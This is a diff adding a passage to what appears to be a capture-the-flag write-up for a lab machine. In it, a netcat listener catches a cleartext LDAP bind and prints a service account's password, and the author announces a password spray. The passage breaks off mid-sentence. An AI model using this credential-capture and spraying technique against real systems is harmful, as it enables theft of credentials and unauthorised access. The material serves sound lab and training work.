@@ -343,5 +343,14 @@ Ive added my ip address and port of my listener
 Ive made sure to use ldap and not ldaps
 
 ```python
-
+nc -lnvp 1337
+listening on [any] 1337 ...
+connect to [10.10.14.90] from (UNKNOWN) [10.129.229.56] 64257
+0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb�lDaP_1n_th3_cle4r!
 ```
+After clicking test ldap profile i got a connection with cleartext creds
+
+```python
+lDaP_1n_th3_cle4r!
+```
+Ill spray this password againsy my
